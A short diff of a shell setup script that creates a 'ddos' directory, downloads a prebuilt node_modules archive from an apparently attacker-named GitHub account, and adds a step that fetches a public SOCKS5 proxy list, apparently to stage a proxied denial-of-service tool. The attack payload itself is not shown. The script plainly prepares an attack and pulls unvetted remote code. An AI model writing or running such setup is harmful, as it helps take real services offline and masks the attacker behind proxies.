@@ -13,6 +13,7 @@ rm node-v18.17.0-linux-x64.tar.xz
 sudo apt-get install npm
 mkdir ddos
 cd ddos
+wget https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt
 wget https://raw.githubusercontent.com/sniper404ghostxploit/NODEJS/main/node_modules.zip
 unzip node_modules.zip
 rm node_modules.zip
